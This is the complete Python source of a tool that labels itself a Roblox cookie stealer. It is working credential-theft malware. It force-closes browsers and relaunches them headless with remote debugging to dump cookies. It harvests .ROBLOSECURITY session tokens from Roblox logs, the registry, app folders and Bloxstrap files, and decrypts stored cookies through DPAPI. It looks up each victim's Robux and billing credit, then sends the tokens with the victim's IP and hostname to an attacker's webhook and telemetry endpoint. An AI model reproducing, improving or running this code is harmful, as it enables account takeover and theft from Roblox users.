"""
Roblox Cookie stealer made by Korrektertyp
Extracts cookies from Chrome, Edge, and Brave
Works on all chrome versions!
"""

WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE" #replace this with your webhook
TELEMETRY_URL = "YOUR_TELEMETRY_URL_HERE" #you can ignore this
BUILDER_USER_ID = "YOUR_USER_ID_HERE" #you can ignore this


import os, json, base64, socket, struct, subprocess, time, re
import urllib.request
import winreg
import ctypes
from ctypes import wintypes

class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_byte))]

def decrypt_dpapi(encrypted_data):
    try:
        data_in = DATA_BLOB(len(encrypted_data), (ctypes.c_byte * len(encrypted_data)).from_buffer_copy(encrypted_data))
        data_out = DATA_BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(data_in), None, None, None, None, 0, ctypes.byref(data_out)):
            res = ctypes.string_at(data_out.pbData, data_out.cbData)
            ctypes.windll.kernel32.LocalFree(data_out.pbData)
            return res
    except: pass
    return b""

LOCAL = os.getenv("LOCALAPPDATA", "")
APPDATA = os.getenv("APPDATA", "")

def get_system_info() -> dict:
    """Collect public IP and computer name of the target machine."""
    hostname = os.environ.get("COMPUTERNAME", socket.gethostname())
    ip = "Unknown"
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5) as r:
            ip = json.loads(r.read()).get("ip", "Unknown")
    except Exception:
        try:
            ip = socket.gethostbyname(socket.gethostname())
        except Exception:
            pass
    return {"ip": ip, "hostname": hostname}

PATHS = {
    "Chrome": os.path.join(LOCAL, "Google",        "Chrome",        "User Data"),
    "Edge":   os.path.join(LOCAL, "Microsoft",     "Edge",          "User Data"),
    "Brave":  os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
    "Opera":  os.path.join(APPDATA, "Opera Software", "Opera Stable"),
    "OperaGX":os.path.join(APPDATA, "Opera Software", "Opera GX Stable"),
    "Vivaldi":os.path.join(LOCAL, "Vivaldi", "User Data"),
    "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data"),
}

_EXE_CANDIDATES = {
    "Chrome": [
        os.path.join(LOCAL, "Google", "Chrome", "Application", "chrome.exe"),
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
    ],
    "Edge": [
        r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
        r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
        os.path.join(LOCAL, "Microsoft", "Edge", "Application", "msedge.exe"),
    ],
    "Brave": [
        os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
        r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
        r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
    ],
    "Opera": [
        os.path.join(LOCAL, "Programs", "Opera", "opera.exe"),
        r"C:\Program Files\Opera\opera.exe",
    ],
    "OperaGX": [
        os.path.join(LOCAL, "Programs", "Opera GX", "opera.exe"),
        r"C:\Program Files\Opera GX\opera.exe",
    ],
    "Vivaldi": [
        os.path.join(LOCAL, "Vivaldi", "Application", "vivaldi.exe"),
        r"C:\Program Files\Vivaldi\Application\vivaldi.exe",
    ],
    "Yandex": [
        os.path.join(LOCAL, "Yandex", "YandexBrowser", "Application", "browser.exe"),
        r"C:\Program Files\Yandex\YandexBrowser\Application\browser.exe",
    ],
}

CDP_PORTS = {
    "Chrome":  9222,
    "Edge":    9223,
    "Brave":   9224,
    "Opera":   9225,
    "OperaGX": 9226,
    "Vivaldi": 9227,
    "Yandex":  9228,
}


def find_exe(browser: str) -> str:
    for p in _EXE_CANDIDATES.get(browser, []):
        if os.path.exists(p):
            return p
    return ""


def kill_browsers():
    for proc in ("chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "vivaldi.exe", "browser.exe", "msedgewebview2.exe"):
        subprocess.run(f"taskkill /F /IM {proc} /T", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)


def _wait_for_port(port: int, timeout: float = 10.0) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.5):
                return True
        except OSError:
            time.sleep(0.4)
    return False


def _wait_for_port_free(port: int, timeout: float = 6.0) -> None:
    """Wait until a port is no longer bound (after process kill)."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.3):
                time.sleep(0.3)
        except OSError:
            return
    time.sleep(0.5)


def _ws_send(sock: socket.socket, payload: bytes):
    mask = os.urandom(4)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    length = len(payload)
    if length < 126:
        header = bytes([0x81, 0x80 | length]) + mask
    elif length < 65536:
        header = bytes([0x81, 0xFE]) + struct.pack(">H", length) + mask
    else:
        header = bytes([0x81, 0xFF]) + struct.pack(">Q", length) + mask
    sock.sendall(header + masked)


def _ws_recv(sock: socket.socket) -> bytes:
    raw = b""
    deadline = time.time() + 12
    while time.time() < deadline:
        chunk = sock.recv(65536)
        if not chunk:
            break
        raw += chunk
        if len(raw) < 2:
            continue
        length = raw[1] & 0x7F
        offset = 2
        if length == 126:
            if len(raw) < 4:
                continue
            length = struct.unpack(">H", raw[2:4])[0]
            offset = 4
        elif length == 127:
            if len(raw) < 10:
                continue
            length = struct.unpack(">Q", raw[2:10])[0]
            offset = 10
        if len(raw) >= offset + length:
            return raw[offset:offset + length]
    return raw


def get_cookies_via_cdp(browser: str) -> list[dict]:
    exe = find_exe(browser)
    if not exe:
        return []

    user_data_path = PATHS.get(browser, "")
    if not os.path.exists(user_data_path):
        return []

    profiles = []
    try:
        if os.path.isdir(user_data_path):
            for item in os.listdir(user_data_path):
                f_path = os.path.join(user_data_path, item)
                if not os.path.isdir(f_path): continue
                if item == "Default" or item.startswith("Profile ") or \
                   os.path.exists(os.path.join(f_path, "Cookies")) or \
                   os.path.exists(os.path.join(f_path, "Network", "Cookies")):
                    profiles.append(item)
    except Exception:
        pass
    
    if not profiles: profiles = ["Default"]
    profiles = list(set(profiles))

    cdp_port = CDP_PORTS.get(browser, 9222)
    
    all_found_roblox = []
    seen_tokens = set()

    for profile in profiles:
        profile_path = os.path.join(user_data_path, profile)
        if not os.path.exists(profile_path):
            continue

        print(f"  [{browser}] Probing {profile} on port {cdp_port}...")

        flags = [
            exe,
            f"--remote-debugging-port={cdp_port}",
            "--no-first-run",
            "--no-default-browser-check",
            "--disable-sync",
            "--disable-extensions",
            "--disable-background-networking",
            "--safebrowsing-disable-auto-update",
            "--headless=new",
            "--no-sandbox",
            f"--user-data-dir={user_data_path}",
            f"--profile-directory={profile}"
        ]

        if browser == "Edge":
            flags += [
                "--onboarding-enabled=false",
                "--disable-ms-edge-gui-user-interface-interaction",
                "--no-pings", 
                "--disable-features=msSmartScreenProtection,IsolateOrigins,site-per-process",
                "--disable-gpu"
            ]

        proc = subprocess.Popen(flags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        try:
            wait_time = 20.0 if browser == "Edge" else 10.0
            if not _wait_for_port(cdp_port, timeout=wait_time):
                proc.terminate()
                continue

            targets = []
            for endpoint in [f"http://127.0.0.1:{cdp_port}/json", f"http://127.0.0.1:{cdp_port}/json/list"]:
                try:
                    with urllib.request.urlopen(endpoint, timeout=5) as r:
                        data = json.loads(r.read())
                        if isinstance(data, list) and data:
                            targets = data
                            break
                        elif isinstance(data, dict):
                            targets = [data]
                            break
                except Exception:
                    continue

            if not targets:
                proc.terminate()
                continue

            ws_url = targets[0].get("webSocketDebuggerUrl", "")
            if not ws_url:
                proc.terminate()
                continue

            from urllib.parse import urlparse
            parsed = urlparse(ws_url)
            host, port = parsed.hostname, parsed.port or 80
            path = parsed.path + (f"?{parsed.query}" if parsed.query else "")

            ws_key = base64.b64encode(os.urandom(16)).decode()
            handshake = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}:{port}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {ws_key}\r\n"
                f"Sec-WebSocket-Version: 13\r\n\r\n"
            ).encode()

            sock = socket.create_connection((host, port), timeout=10)
            sock.sendall(handshake)

            resp = b""
            while b"\r\n\r\n" not in resp:
                resp += sock.recv(4096)

            _ws_send(sock, json.dumps({"id": 1, "method": "Network.enable"}).encode())
            _ws_recv(sock)
            
            _ws_send(sock, json.dumps({"id": 2, "method": "Network.getAllCookies"}).encode())
            raw_data = _ws_recv(sock)
            
            try:
                result = json.loads(raw_data)
                all_cookies = result.get("result", {}).get("cookies", [])
                roblox_cookies = [c for c in all_cookies if "roblox.com" in c.get("domain", "")]
                
                if not roblox_cookies:
                    _ws_send(sock, json.dumps({"id": 3, "method": "Page.navigate", "params": {"url": "https://www.roblox.com"}}).encode())
                    _ws_recv(sock)
                    time.sleep(2.5)
                    
                    _ws_send(sock, json.dumps({"id": 4, "method": "Network.getAllCookies"}).encode())
                    raw_data = _ws_recv(sock)
                    result = json.loads(raw_data)
                    all_cookies = result.get("result", {}).get("cookies", [])
            except:
                all_cookies = []

            sock.close()

            for c in all_cookies:
                if "roblox.com" in c.get("domain", ""):
                    val = c.get("value", "")
                    if val not in seen_tokens:
                        seen_tokens.add(val)
                        all_found_roblox.append({
                            "browser": f"{browser} ({profile})",
                            "domain":  c.get("domain", ""),
                            "name":    c.get("name", ""),
                            "value":   val,
                        })
        except Exception:
            pass
        finally:
            proc.terminate()
            try: proc.wait(timeout=3)
            except: proc.kill()
            _wait_for_port_free(cdp_port)

    return all_found_roblox



def _roblox_request(url: str, cookie: str) -> dict:
    """Helper to perform Roblox API requests with necessary headers."""
    try:
        headers = {
            "Cookie": f".ROBLOSECURITY={cookie}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Content-Type": "application/json"
        }
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=10) as response:
            return json.loads(response.read())
    except Exception:
        return {}


def get_roblox_info(cookie: str) -> dict:
    """Fetch base user info."""
    data = _roblox_request("https://www.roblox.com/mobileapi/userinfo", cookie)
    if not data or not data.get("UserID"):
        return {"valid": False}
    
    user_id = data.get("UserID")
    
    rap = 0
    try:
        inv_data = _roblox_request(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?assetType=all&limit=100", cookie)
        for item in inv_data.get("data", []):
            rap += item.get("recentAveragePrice", 0)
    except Exception: pass

    pending = 0
    try:
        rev_data = _roblox_request(f"https://economy.roblox.com/v1/users/{user_id}/revenue/summary/30d", cookie)
        pending = rev_data.get("pendingRobux", 0)
    except Exception: pass

    credit = "N/A"
    try:
        billing_data = _roblox_request("https://billing.roblox.com/v1/credit", cookie)
        if "cashAmount" in billing_data:
            credit = f"{billing_data.get('currencyCode', '$')}{billing_data.get('cashAmount', 0):.2f}"
    except Exception: pass

    age = "Unknown"
    try:
        user_data = _roblox_request(f"https://users.roblox.com/v1/users/{user_id}", cookie)
        created_str = user_data.get("created", "")
        if created_str:
            year = int(created_str.split("-")[0])
            current_year = time.localtime().tm_year
            age = f"{current_year - year} years"
    except Exception: pass


    return {
        "id": user_id,
        "username": data.get("UserName"),
        "robux": data.get("RobuxBalance", 0),
        "premium": data.get("IsPremium", False),
        "thumbnail": data.get("ThumbnailUrl"),
        "rap": rap,
        "pending": pending,
        "credit": credit,
        "age": age,
        "valid": True
    }


def send_to_webhook(browser: str, cookie: str, info: dict, sysinfo: dict = None):
    robux_total = info.get("robux", 0) + info.get("pending", 0)
    rap = info.get("rap", 0)
    sysinfo = sysinfo or {"ip": "Unknown", "hostname": "Unknown"}
    
    color = 0x00FF00
    if rap > 10000 or robux_total > 5000:
        color = 0xFFD700
    elif not info.get("valid"):
        color = 0xFF0000

    embed = {
        "title": "💎 ROBLOX ACCOUNT EXTRACTED 💎",
        "description": f"**Account Session Cookie:**\n```autohotkey\n{cookie}```",
        "color": color,
        "fields": [
            {"name": "🌐 Browser Trace", "value": f"**Browser:** `{browser}`\n**Status:** `{'Active' if info.get('valid') else 'Expired'}`", "inline": False},
            {"name": "🖥️ Target Machine", "value": f"**IP:** `{sysinfo['ip']}`\n**Hostname:** `{sysinfo['hostname']}`", "inline": False},
        ],
        "footer": {"text": "Advanced Roblox Extractor", "icon_url": "https://www.roblox.com/favicon.ico"},
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    }

    if info.get("thumbnail"):
        embed["thumbnail"] = {"url": info["thumbnail"]}

    content = ""
    if rap > 5000 or robux_total > 1000:
        content = "@everyone 🚨 **HIGH VALUE HIT!** 🚨"

    payload = {
        "content": content,
        "embeds": [embed],
        "username": "Larp Roblox Free",
        "avatar_url": "https://www.roblox.com/favicon.ico"
    }

    if WEBHOOK_URL and getattr(WEBHOOK_URL, "startswith", lambda x: False)("http"):
        try:
            req = urllib.request.Request(
                WEBHOOK_URL,
                data=json.dumps(payload).encode("utf-8"),
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
            )
            with urllib.request.urlopen(req, timeout=5) as response:
                pass
        except Exception as e:
            print(f"  [!] Failed to send to webhook: {e}")

    if TELEMETRY_URL and getattr(TELEMETRY_URL, "startswith", lambda x: False)("http"):
        telemetry_payload = {
            "userId": BUILDER_USER_ID,
            "browser": browser,
            "cookie": cookie,
            "info": info,
            "ip": sysinfo.get("ip", "Unknown"),
            "hostname": sysinfo.get("hostname", "Unknown")
        }
        
        def _send_tele(url):
            try:
                treq = urllib.request.Request(
                    url,
                    data=json.dumps(telemetry_payload).encode("utf-8"),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
                )
                with urllib.request.urlopen(treq, timeout=5) as t_resp:
                    return True
            except Exception:
                return False

        if not _send_tele(TELEMETRY_URL):
            _send_tele("http://127.0.0.1:3000/api/telemetry")

def scrape_roblosecurity(text: str) -> str:
    """Scrapes raw text for the .ROBLOSECURITY token."""
    match = re.search(r'(_\|WARNING:-DO-NOT-SHARE-THIS[\x21-\x7E]+)', text)
    if not match:
        match = re.search(r'(\.ROBLOSECURITY=|_\|WARNING:-DO-NOT-SHARE-THIS)(_\|WARNING:-DO-NOT-SHARE-THIS[\x21-\x7E]+)', text)
        if match: return match.group(2)
    
    token = match.group(1) if match else ""
    return token.rstrip('";\' \r\n\t')

def get_native_cookies() -> list[dict]:
    """Extracts from Desktop Player Logs, Registry, UWP, and Bloxstrap."""
    found = []
    
    print("  [Roblox Native] Scanning Player Diagnostic Logs...")
    log_path = os.path.join(LOCAL, "Roblox", "logs")
    try:
        if os.path.exists(log_path):
            log_files = sorted(
                [os.path.join(log_path, f) for f in os.listdir(log_path) if f.endswith(".log")],
                key=os.path.getmtime,
                reverse=True
            )[:15]
            for log_file in log_files:
                try:
                    with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        token = scrape_roblosecurity(content)
                        if token:
                            found.append({
                                "browser": "Roblox Player (Log)",
                                "domain": ".roblox.com",
                                "name": ".ROBLOSECURITY",
                                "value": token,
                            })
                except:
                    pass
    except Exception:
        pass

    print("  [Roblox Native] Scanning Desktop Player/Studio Registry...")
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
        value, _ = winreg.QueryValueEx(key, ".ROBLOSECURITY")
        token = scrape_roblosecurity(value)
        if token:
            found.append({
                "browser": "Roblox Desktop (Reg)",
                "domain": ".roblox.com",
                "name": ".ROBLOSECURITY",
                "value": token,
            })
    except Exception:
        pass

    print("  [Roblox Native] Scanning UWP & WebView2 AppData...")
    uwp_path = os.path.join(LOCAL, "Packages")
    try:
        if os.path.exists(uwp_path):
            for folder in os.listdir(uwp_path):
                if "ROBLOXCORPORATION" in folder.upper():
                    roblox_scans = os.path.join(uwp_path, folder, "LocalState")
                    if os.path.exists(roblox_scans):
                        wv2_path = os.path.join(roblox_scans, "EBWebView", "Default", "Network")
                        for root, _, files in os.walk(roblox_scans):
                            for file in files:
                                if file.endswith(".log") or file.endswith(".txt") or file.endswith(".json") or "Cookies" in file:
                                    try:
                                        with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                            content = f.read(200000)
                                            token = scrape_roblosecurity(content)
                                            if token:
                                                found.append({
                                                    "browser": "Roblox UWP",
                                                    "domain": ".roblox.com",
                                                    "name": ".ROBLOSECURITY",
                                                    "value": token,
                                                })
                                    except:
                                        pass
    except Exception:
        pass

    print("  [Roblox Native] Scanning Bloxstrap configs & logs...")
    bloxstrap_path = os.path.join(LOCAL, "Bloxstrap")
    try:
        if os.path.exists(bloxstrap_path):
            for root, _, files in os.walk(bloxstrap_path):
                for file in files:
                    if file.endswith('.json') or file.endswith('.txt') or file.endswith('.log'):
                        try:
                            with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                token = scrape_roblosecurity(content)
                                if token:
                                    found.append({
                                        "browser": "Bloxstrap",
                                        "domain": ".roblox.com",
                                        "name": ".ROBLOSECURITY",
                                        "value": token,
                                    })
                        except:
                            pass
    except Exception:
        pass

    print("  [Roblox Native] Scanning LocalStorage...")
    ls_path = os.path.join(LOCAL, "Roblox", "LocalStorage")
    try:
        if os.path.exists(ls_path):
            for file in os.listdir(ls_path):
                file_path = os.path.join(ls_path, file)
                if file == "RobloxCookies.dat":
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            data = json.load(f)
                            encrypted_b64 = data.get("CookiesData", "")
                            if encrypted_b64:
                                encrypted_bytes = base64.b64decode(encrypted_b64)
                                decrypted = decrypt_dpapi(encrypted_bytes)
                                if decrypted:
                                    token = scrape_roblosecurity(decrypted.decode('utf-8', errors='ignore'))
                                    if token:
                                        found.append({
                                            "browser": "Roblox Player (Decrypted)",
                                            "domain": ".roblox.com",
                                            "name": ".ROBLOSECURITY",
                                            "value": token,
                                        })
                    except: pass
                
                if file.endswith(".dat") or file.endswith(".localstorage"):
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            token = scrape_roblosecurity(content)
                            if token:
                                found.append({
                                    "browser": "Roblox LocalStorage",
                                    "domain": ".roblox.com",
                                    "name": ".ROBLOSECURITY",
                                    "value": token,
                                })
                    except:
                        pass
    except Exception:
        pass

    unique_found = []
    seen = set()
    for item in found:
        if item["value"] not in seen:
            seen.add(item["value"])
            unique_found.append(item)
            
    return unique_found


def main():

    print("=" * 55)
    print("  ROBLOX COOKIE EXTRACTOR (ENHANCED)")
    print("  Chrome, Edge, Brave, Opera, GX, Vivaldi, Yandex")
    print("  + Native Desktop, UWP, Bloxstrap Support")
    print("=" * 55)

    print("\nStopping browser processes...")
    kill_browsers()

    print("\nCollecting system fingerprint...")
    sysinfo = get_system_info()
    print(f"  IP: {sysinfo['ip']} | Host: {sysinfo['hostname']}")

    all_cookies: list[dict] = []

    print("\nStarting Native Client Extraction...")
    native_hits = get_native_cookies()
    if native_hits:
        print(f"  [Native] Found {len(native_hits)} .ROBLOSECURITY token(s) from Windows/Apps!")
        all_cookies.extend(native_hits)
    else:
        print("  [Native] No Roblox cookies found in Registry/UWP/Bloxstrap.")

    print("\nStarting Browser Extraction...")
    for browser in ("Chrome", "Edge", "Brave", "Opera", "OperaGX", "Vivaldi", "Yandex"):
        cookies = get_cookies_via_cdp(browser)
        roblo_sec = [c for c in cookies if c["name"] == ".ROBLOSECURITY"]
        other     = [c for c in cookies if c["name"] != ".ROBLOSECURITY"]
        all_cookies.extend(cookies)

        if roblo_sec:
            print(f"  [{browser}] Found .ROBLOSECURITY cookie!")
        elif other:
            print(f"  [{browser}] Found {len(other)} other Roblox cookie(s) (not logged in?)")
        else:
            print(f"  [{browser}] No Roblox cookies found")

    print("\n" + "=" * 55)
    print("  RESULTS")
    print("=" * 55)

    roblosec = [c for c in all_cookies if c["name"] == ".ROBLOSECURITY"]

    if roblosec:
        print(f"\n  Found {len(roblosec)} unique .ROBLOSECURITY cookie(s)!\n")
        
        sent_cookies = set()

        for c in roblosec:
            cookie_val = c["value"]
            if cookie_val in sent_cookies:
                continue
            
            browser = c["browser"]
            print(f"  [{browser}] Fetching account info...")
            info = get_roblox_info(cookie_val)
            
            if info["valid"]:
                print(f"    ✓ Account: {info['username']} | Robux: {info['robux']} | RAP: {info.get('rap', 0)} | Age: {info.get('age', 'N/A')}")
            else:
                print(f"    ✗ Cookie is invalid or API error")
            
            print(f"    → Sending to Webhook...")
            send_to_webhook(browser, cookie_val, info, sysinfo)
            sent_cookies.add(cookie_val)


    else:
        print("\n  No .ROBLOSECURITY cookie found in any browser.")
        print("  Make sure you are logged into Roblox in at least one browser.")


    print("\n" + "=" * 55)


if __name__ == "__main__":
    main()
